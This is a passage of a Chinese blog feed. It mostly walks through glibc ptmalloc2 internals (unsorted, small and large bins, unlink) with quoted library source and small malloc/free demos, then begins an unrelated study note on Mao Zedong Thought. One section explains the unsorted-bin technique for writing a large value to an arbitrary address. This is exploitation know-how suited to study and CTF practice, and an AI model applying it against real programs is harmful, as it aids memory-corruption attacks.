data-language="C"><code class="language-C">if (!nextinuse) &#123;unlink(av, nextchunk, bck, fwd);size +&#x3D; nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="任意地址写为一个很大的数值"><a href="#任意地址写为一个很大的数值" class="headerlink" title="任意地址写为一个很大的数值"></a>任意地址写为一个很大的数值</h3><p>原理：将 <code>bck-&gt;fd</code> 的位置写入本 <code>unsorted Bin</code> 的位置，控制了<code>bk</code>即可将<code>unsorted_chunks (av)</code>写到任意地址（写入的地址要减两倍机器字长），将该堆申请出来就可以实现任意地址改为一个不可控的很大的数值</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><h2 id="free到small-bin"><a href="#free到small-bin" class="headerlink" title="free到small bin"></a>free到small bin</h2><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x110);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-5"><a href="#运行过程-5" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[从unsorted bin取出chunk](#从unsorted bin取出chunk)的将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p></li><li><p>判断<code>unsorted bin</code>中循环到的堆是否和申请的堆大小精确匹配，不匹配则跳过</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (size &#x3D;&#x3D; nb)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断是否属于<code>small bin</code>，属于则获取所在的<code>small bin</code>链下标和头结点和首结点，并且将循环到的堆连接到<code>small bin</code>的头部</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (size))            &#123;              victim_index &#x3D; smallbin_index (size);              bck &#x3D; bin_at (av, victim_index);              fwd &#x3D; bck-&gt;fd;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim-&gt;bk &#x3D; bck;         victim-&gt;fd &#x3D; fwd;         fwd-&gt;bk &#x3D; victim;         bck-&gt;fd &#x3D; victim;if (in_smallbin_range (size))           &#123;             victim_index &#x3D; smallbin_index (size);             bck &#x3D; bin_at (av, victim_index);             fwd &#x3D; bck-&gt;fd;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从small-bin取出chunk"><a href="#从small-bin取出chunk" class="headerlink" title="从small bin取出chunk"></a>从small bin取出chunk</h2><h3 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x110);    malloc(0x100);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-6"><a href="#运行过程-6" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的判断是否属于<code>smallbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取申请的堆的大小所在的下标和地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; smallbin_index (nb);bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断所在的下标的链是否为空，为空则说明获取失败跳过该部分</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>不为空则判断获取到的链表尾部的堆是否为空，为空则说明<code>small bin</code>未初始化，调用<code>malloc_consolidate</code>进行初始化</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)        &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;            malloc_consolidate (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不为空则先获取最后一个结点的下一个结点，判断下一个结点的<code>fd</code>是否为最后一个结点，不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else           &#123;             bck &#x3D; victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))               &#123;                 errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;                 goto errout;               &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通过安全检查之后将最后一个结点设置<code>inuse</code>和<code>NON_MAIN_ARENA</code>位并且从链表中取出，返回该堆的地址指针</p></li></ul><pre class="line-numbers language-C" data-language="C"><code class="language-C">set_inuse_bit_at_offset (victim, nb);bin-&gt;bk &#x3D; bck;bck-&gt;fd &#x3D; bin;if (av !&#x3D; &amp;main_arena)  victim-&gt;size |&#x3D; NON_MAIN_ARENA;check_malloced_chunk (av, victim, nb);void *p &#x3D; chunk2mem (victim);alloc_perturb (p, bytes);return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><h2 id="free到large-bin"><a href="#free到large-bin" class="headerlink" title="free到large bin"></a>free到large bin</h2><h3 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x500);    malloc(0x500);free(p);    malloc(0x550);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-7"><a href="#运行过程-7" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[从unsorted bin取出chunk](#从unsorted bin取出chunk)的将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p></li><li><p>判断是否在<code>small bin</code> ，如果不在则在<code>large bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (size))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取循环到的堆在<code>large bin</code>中的下标并且取得该链表的首结点<code>bck</code>和头结点<code>fwd</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim_index &#x3D; largebin_index (size);bck &#x3D; bin_at (av, victim_index);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>判断头结点和首结点是否相同，相同则说明该链表为空，直接跳过一些判断和连接，将该堆插入在<code>fd</code> <code>bk</code> 双向链表的头部，并且设置其<code>fd_nextsize</code>和<code>bk_nextsize</code>都为其本身</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (fwd !&#x3D; bck)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                victim-&gt;fd_nextsize &#x3D; victim-&gt;bk_nextsize &#x3D; victim;         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">mark_bin (av, victim_index);victim-&gt;bk &#x3D; bck;victim-&gt;fd &#x3D; fwd;fwd-&gt;bk &#x3D; victim;bck-&gt;fd &#x3D; victim;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>若不相同，即<code>if</code>成立则说明该链中还有其他堆，首先获取到循环到的堆的大小去掉<code>inuse</code>位之后的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Or with inuse bit to speed comparisons *&#x2F;                  size |&#x3D; PREV_INUSE;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果最后一个堆在<code>main_arena</code>则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果循环到的堆的大小小于最小的堆那么插入在<code>fd_nextsize</code> <code>nk_nextsize</code>链中最小的堆的后面</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))                    &#123;                      fwd &#x3D; bck;                      bck &#x3D; bck-&gt;bk;                      victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd;                      victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;                      fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果不是最小的堆那么遍历到第一个不小于该堆的<code>chunk</code>，遍历中判断每一个堆是否属于<code>main_arena</code>，属于则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                   &#123;                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                     while ((unsigned long) size &lt; fwd-&gt;size)                       &#123;                         fwd &#x3D; fwd-&gt;fd_nextsize;                         assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                       &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果遍历到的堆和循环中的堆的大小相同则在<code>fd</code> <code>bk</code>链表中插入到与其相同大小的堆的后面</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) size &#x3D;&#x3D; (unsigned long) fwd-&gt;size)                       &#x2F;* Always insert in the second position.  *&#x2F;                       fwd &#x3D; fwd-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>否则就插入在<code>fd_nextsize</code> <code>nk_nextsize</code>链中遍历到的堆的后面</p><pre class="line-numbers language-none"><code class="language-none">else                        &#123;                          victim-&gt;fd_nextsize &#x3D; fwd;                          victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize &#x3D; victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>并且插入到<code>fd</code> <code>bk</code>链表中</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; fwd-&gt;bk;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">mark_bin (av, victim_index);victim-&gt;bk &#x3D; bck;victim-&gt;fd &#x3D; fwd;fwd-&gt;bk &#x3D; victim;bck-&gt;fd &#x3D; victim;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从large-bin取出chunk"><a href="#从large-bin取出chunk" class="headerlink" title="从large bin取出chunk"></a>从large bin取出chunk</h2><h3 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x500);    malloc(0x500);free(p);    malloc(0x550);    malloc(0x500);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-8"><a href="#运行过程-8" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[free到large bin](#free到large bin)结束</p></li><li><p>判断是否不属于<code>small bin</code>，即是否属于<code>large bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取申请的堆所在的<code>large bin</code>链的地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断是否该链为空或者最大的堆太小不能符合申请的堆的大小，若是则直接结束对<code>large bin</code>中申请堆的判断，若符合则获取了第一个堆到<code>victim</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; first (bin)) !&#x3D; bin &amp;&amp;              (unsigned long) (victim-&gt;size) &gt;&#x3D; (unsigned long) (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>在<code>fd_nextsize</code> <code>bk_nextsize</code>链中循环遍历到第一个不小于申请的大小的堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; victim-&gt;bk_nextsize;              while (((unsigned long) (size &#x3D; chunksize (victim)) &lt;                      (unsigned long) (nb)))                victim &#x3D; victim-&gt;bk_nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断遍历到的堆不是尾结点并且它的大小等于它在<code>fd</code> <code>bk</code>链上的上一个堆的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (victim !&#x3D; last (bin) &amp;&amp; victim-&gt;size &#x3D;&#x3D; victim-&gt;fd-&gt;size)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取该大小的堆在<code>fd</code> <code>bk</code>链上的第二个堆，因为第一个堆在<code>fd_nextsize</code> <code>bk_nextsize</code>链中，取出需要调整该链，但取出第二个堆就不需要调整链表</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; victim-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>保存该堆大小减去申请的大小的差值并且通过<a href="#unlink">unlink</a>操作从<code>large bin</code>链表中取出该堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">remainder_size &#x3D; size - nb;unlink (av, victim, bck, fwd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果差值小于最小的堆的大小，则直接将该堆返回</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);&#x2F;&#x2F;设置inuse位                  if (av !&#x3D; &amp;main_arena)                    victim-&gt;size |&#x3D; NON_MAIN_ARENA;&#x2F;&#x2F;设置NON_MAIN_ARENA位                &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *p &#x3D; chunk2mem (victim);         alloc_perturb (p, bytes);         return p;&#x2F;&#x2F;获取并返回该堆的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>如果差值大于最小的堆的大小则切割<code>large bin</code>，获取上面取到的堆切割了申请的大小的堆之后剩余的堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                &#123;                  remainder &#x3D; chunk_at_offset (victim, nb);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的首结点和头结点</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; unsorted_chunks (av);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>检查头结点的<code>bk</code>指向的堆是否是首结点，若不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (fwd-&gt;bk !&#x3D; bck))&#x2F;&#x2F;检查头结点后面一个结点是否是首结点                    &#123;                      errstr &#x3D; &quot;malloc(): corrupted unsorted chunks&quot;;                      goto errout;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将剩余的堆插入<code>unsorted bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">remainder-&gt;bk &#x3D; bck;            remainder-&gt;fd &#x3D; fwd;            bck-&gt;fd &#x3D; remainder;            fwd-&gt;bk &#x3D; remainder;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果剩余的堆不在<code>small bin</code> 的范围内则设置<code>fd_nextsize</code>和<code>bk_nextsize</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize &#x3D; NULL;                      remainder-&gt;bk_nextsize &#x3D; NULL;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>返回切割的符合大小要求的堆的地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);              alloc_perturb (p, bytes);&#x2F;&#x2F;返回切割出来的申请的大小的堆地址              return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take a chunk off a bin list *&#x2F;&#x2F;&#x2F; unlink p#define unlink(AV, P, BK, FD) &#123;                                                &#x2F;&#x2F; 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。    if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))            malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                   FD &#x3D; P-&gt;fd;                                                                          BK &#x3D; P-&gt;bk;                                                                          &#x2F;&#x2F; 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。    if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);      else &#123;                                                                              FD-&gt;bk &#x3D; BK;                                                                      BK-&gt;fd &#x3D; FD;                                                                      &#x2F;&#x2F; 下面主要考虑 P 对应的 nextsize 双向链表的修改        if (!in_smallbin_range (chunksize_nomask (P))                                          &#x2F;&#x2F; 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。            &#x2F;&#x2F; 那么其实也就没有必要对 nextsize 字段进行修改了。            &#x2F;&#x2F; 这里没有去判断 bk_nextsize 字段，可能会出问题。            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize !&#x3D; NULL, 0)) &#123;                                  &#x2F;&#x2F; 类似于小的 chunk 的检查思路            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)                              || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))                  malloc_printerr (check_action,                                                                     &quot;corrupted double-linked list (not small)&quot;,                                   P, AV);                                                          &#x2F;&#x2F; 这里说明 P 已经在 nextsize 链表中了。            &#x2F;&#x2F; 如果 FD 没有在 nextsize 链表中            if (FD-&gt;fd_nextsize &#x3D;&#x3D; NULL) &#123;                                                      &#x2F;&#x2F; 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P                &#x2F;&#x2F; 令 FD 为 nextsize 串起来的                if (P-&gt;fd_nextsize &#x3D;&#x3D; P)                                                        FD-&gt;fd_nextsize &#x3D; FD-&gt;bk_nextsize &#x3D; FD;                                      else &#123;                                                                              &#x2F;&#x2F; 否则我们需要将 FD 插入到 nextsize 形成的双链表中                    FD-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                                                  FD-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                                                  P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; FD;                                                  P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; FD;                                                &#125;                                                                            &#125; else &#123;                                                                              &#x2F;&#x2F; 如果在的话，直接拿走即可                P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                                      P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                                    &#125;                                                                                &#125;                                                                            &#125;                                                                              &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;相关结构体&quot;&gt;&lt;a href=&quot;#相关结构体&quot; class=&quot;headerlink&quot; title=&quot;相关结构体&quot;&gt;&lt;/a&gt;相关结构体&lt;/h1&gt;&lt;h3 id=&quot;malloc-state&quot;&gt;&lt;a href=&quot;#malloc-state&quot; cl</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="ptmalloc2" scheme="https://starrysky1004.github.io/tags/ptmalloc2/"/>
    
  </entry>
  
  <entry>
    <title>毛概</title>
    <link href="https://starrysky1004.github.io/2023/04/15/mao-gai/"/>
    <id>https://starrysky1004.github.io/2023/04/15/mao-gai/</id>
    <published>2023-04-15T06:04:21.000Z</published>
    <updated>2023-04-15T06:20:56.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="马克思主义中国化时代化的几大理论成果各自回答了什么问题？"><a href="#马克思主义中国化时代化的几大理论成果各自回答了什么问题？" class="headerlink" title="马克思主义中国化时代化的几大理论成果各自回答了什么问题？"></a>马克思主义中国化时代化的几大理论成果各自回答了什么问题？</h2><p><strong>毛泽东思想：</strong>毛泽东思想紧紧围绕着中国革命和建设这个主题，构成一个完整的科学思想体系，包含新民主主义革命理论、社会主义革命和社会主义建设理论等内容，在实践中解決了中国人民如何站起水的问题；<br><strong>中国特色社会主义理论体系：</strong>包括邓小平理论、“三个代表〞 重要思想以及科学发展观等重大战略思想在内的科学理论体系。习近平新时代中国特色社会主义理论体系是马克思主义中国化最新理论成果。中国特色社会理论解決了中国人民如何富起来和强起来的问题。</p><h2 id="如何理解毛泽东思想的活的灵魂？"><a href="#如何理解毛泽东思想的活的灵魂？" class="headerlink" title="如何理解毛泽东思想的活的灵魂？"></a>如何理解毛泽东思想的活的灵魂？</h2><p>毛泽东思想的活的灵魂，是贯穿于上述各个理论的立场、观点和方法。它们有三个基本方面，即实事求是，群众路线，独立自主。实事求是，就是不断地深化对中国国情的认识，找出适合中国情况的革命和建设道路，确定我们党领导人民改造中国、建设中国的战略策略，实现推动历史前进的目标。群众路线，就是把马克思列宁主义关于人民群众是历史创造者的原理，系统地运用在党的全部活动中，形成的党的根本工作路线。独立自主，就是坚定不移地维护民族独立、捍卫国家主权，把立足点放在依靠自己力量的基础上，同时积极争取外援，开展国际经济文化交流，学习外国一切对我们有益的先进事物。毛泽东把辩证唯物主义和历史唯物主义运用于党的全部工作，在中国革命和建设的长期艰苦奋斗中形成了具有中国共产党人特色的这些立场、观点和方法，丰富和发展了马克思列宁主义。</p><h2 id="如何理解中国新民主主义革命的性质和前途？"><a href="#如何理解中国新民主主义革命的性质和前途？" class="headerlink" title="如何理解中国新民主主义革命的性质和前途？"></a>如何理解中国新民主主义革命的性质和前途？</h2><h3 id="新民主主义革命的性质和前途"><a href="#新民主主义革命的性质和前途" class="headerlink" title="新民主主义革命的性质和前途"></a>新民主主义革命的性质和前途</h3><h4 id="1-新民主主义革命的性质"><a href="#1-新民主主义革命的性质" class="headerlink" title="1.新民主主义革命的性质"></a>1.新民主主义革命的性质</h4><p>近代中国半殖民地半封建社会的性质和中国革命的历史任务，决定了中国革命的性质不是无产阶级社会主义革命，而是资产阶级民主主义革命。因为新民主主义革命的目标是终结半殖民地半封建社会形态。革命的对象主要是帝国主义和封建主义势力，革命的动力还包括资产阶级，所以，中国革命已不是旧式的、一般的资产阶级民主主义的革命，而是新的民主主义革命。</p><h4 id="2-与旧民主主义革命比较-新民主主义革命与旧民主主义革命相比有新的内容和特点，集中表现在："><a href="#2-与旧民主主义革命比较-新民主主义革命与旧民主主义革命相比有新的内容和特点，集中表现在：" class="headerlink" title="2.与旧民主主义革命比较 新民主主义革命与旧民主主义革命相比有新的内容和特点，集中表现在："></a>2.与旧民主主义革命比较 新民主主义革命与旧民主主义革命相比有新的内容和特点，集中表现在：</h4><ul><li>a.中国革命处于世界无产阶级社会主义革命的时代，是世界无产阶级社会主义革命的一部分。</li><li>b.革命的领导力量是中国无产阶级及其先锋队一一中国共产党。</li><li>c.革命的指导思想是马克思列宁主义。</li><li>d.革命的前途是社会主义而不是资本主义。</li></ul><h4 id="3-与社会主义革命的区别和联系"><a href="#3-与社会主义革命的区别和联系" class="headerlink" title="3.与社会主义革命的区别和联系"></a>3.与社会主义革命的区别和联系</h4><ul><li>a.区别：新民主主义革命与社会主义革命性质不同。新民主主义革命仍然属于资产阶级民主主 义革命的范畴。它要建立的是无产阶级领导的各革命阶级的联合专政，而不是无产阶级专政。社 会主义革命是无产阶级性质的革命，它所要实现的目标是消灭资本主义剥削制度和改造小生产 的私有制。</li><li>b.联系：新民主主义革命与社会主义革命也是互相联系、紧密街接的，中间不容横插一个资产 阶级专政。坚决地领导民主革命，是争取社会主义胜利的条件。民主主义革命是社会主义革命的 必要准备，社会主义革命是民主主义革命的必然趋势。</li></ul><h4 id="4-如何理解新民主主义革命的三大法宝及其相互关系？"><a href="#4-如何理解新民主主义革命的三大法宝及其相互关系？" class="headerlink" title="4.如何理解新民主主义革命的三大法宝及其相互关系？"></a>4.如何理解新民主主义革命的三大法宝及其相互关系？</h4><p>答：统一战线，武装斗争，党的建设，是中国共产觉在中国草命中战胜致人的三个法宝。统一战线和武装斗争是中国革命的两个基本特点，是战胜政人的两个基木武器。统一战线是实行武装斗争的统一战线，武装斗争是统一战线的中心文柱党的建设则是掌握统一战线和武装斗争这两个武器以实行对敌冲锋陷阵的英勇战士。</p><h4 id="5-怎样理解觉在过渡时期的总路线？"><a href="#5-怎样理解觉在过渡时期的总路线？" class="headerlink" title="5.怎样理解觉在过渡时期的总路线？"></a>5.怎样理解觉在过渡时期的总路线？</h4><p>党在过波时期总路线的主要内容是“一化三改”。</p><ul><li>“一化”即国家社会主义工业化</li><li>“三改”即对个体农业、手工业和对资本主义工商业的社会主义改造。</li><li>它们之间相互联系，不可分离，可以比喻为鸟的“主体”和“两翼，</li></ul><h4 id="6-我国社会主义改造的基本经验有哪些？"><a href="#6-我国社会主义改造的基本经验有哪些？" class="headerlink" title="6.我国社会主义改造的基本经验有哪些？"></a>6.我国社会主义改造的基本经验有哪些？</h4><ul><li><p>第一，坚持社会主义工业化建设与社会主义改造同时并举。实现以社会主义工业化为主体，完成对农业、手工业社会主义改造和对资本主义工商业社会主义改造为两翼，是党在过渡时期总路线的明确要求。实践证明，觉坚持社会主义改造与社会主义工业化同时并举的方针，对于在深刻的社会变革中保持社会稳定，逐步改善人民生活，推动社会发展，都具有十分重要的意义。</p></li><li><p>第二，采取积极引导、逐步过渡的方式。我国对农业、手工业和资本主义工商业的改造都采取了区别对象，用不同的办法积极引1导、逐步过渡的方式。中国的这场巨大而深刻的社会变革，不仅没有对生产力的发展造成破坏，而且促进了生产力的发展。</p></li><li><p>第三，进行和平改造。在社会主义改造之前，无论是资本主义工商业，还是农民和手工业者的个体所有制，都具有私有制的性质。在农业社会主义改造方面，用事实向农民表明合作化的好处和给农民带来的利益，使农民拥护党的政策。手工业者的情况和农民基本相同。同时以和平陵买的方法完成了对资木主义工商业的社会主义改造，并把对资本主义企业的改造和对资本家个人的改造结合在一起进行。对资本家实行团结、教育和改造的方针，不仅稳定了资本家的思想，提高了他们的认识，保证了改造的顺利进行，而且将几十万资本家改造成自食其力的劳动者，成为社会主义企业的经营和管理千部。这不仅保证了社会的稳定，而且极大地促进了社会主义事业的发展。</p></li></ul><p>总之，和平改造解快了诸如实现社会变革与经济发展、和平过渡与消灭剥削制度这类通常难以解決的矛盾问题。</p><h4 